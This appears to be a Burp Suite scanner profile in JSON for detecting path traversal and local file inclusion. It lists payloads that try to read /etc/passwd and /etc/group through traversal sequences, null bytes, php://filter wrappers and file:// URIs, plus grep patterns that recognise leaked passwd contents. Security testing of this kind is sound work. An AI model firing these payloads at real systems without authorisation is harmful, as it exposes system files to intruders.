[{"Name":"path-traversal-replace","Enabled":false,"Scanner":1,"Author":"@GochaOqradze","Payloads":["/etc/passwd","/%5c../%5c../%5c../%5c../%5c../%5c../%5c../etc/passwd/","/../../../../../../../../../etc/passwd","/../../../../../../../../../etc/passwd%00","/../../../../../../../../../etc/passwd\\u0000","php://filter/convert.base64-encode/resource\u003d../../../../../../../../../../etc/group","php://filter/convert.base64-encode/resource\u003d../../../../../../../../../../etc/group\\x00","file:///etc/passwd","file:///../../../../../../../../../etc/passwd","file:///../../../../../../../../../etc/passwd\\x00"],"Encoder":[],"UrlEncode":false,"CharsToUrlEncode":"","Grep":["true,Or,cm9vdDp4OjA6Cm","true,Or,[a-z]*:[^:]*:[0-9]*:[0-9]*:[^:]*:\\/[^:]*:\\/[^:]*"],"Tags":["lfi","All"],"PayloadResponse":false,"NotResponse":false,"TimeOut":"","isTime":false,"contentLength":"","iscontentLength":false,"CaseSensitive":false,"ExcludeHTTP":false,"OnlyHTTP":false,"IsContentType":false,"ContentType":"","NegativeCT":false,"IsResponseCode":false,"ResponseCode":"","NegativeRC":false,"isurlextension":false,"NegativeUrlExtension":false,"MatchType":2,"RedirType":0,"MaxRedir":0,"payloadPosition":1,"payloadsFile":"","grepsFile":"","IssueName":"path-traversal-replace","IssueSeverity":"High","IssueConfidence":"Firm","IssueDetail":"path-traversal-replace","RemediationDetail":"","IssueBackground":"","RemediationBackground":"","Header":[],"VariationAttributes":[],"InsertionPointType":[65,32,1,2,6,33,5,64,0,3,4,37,127],"Scantype":0,"pathDiscovery":false}]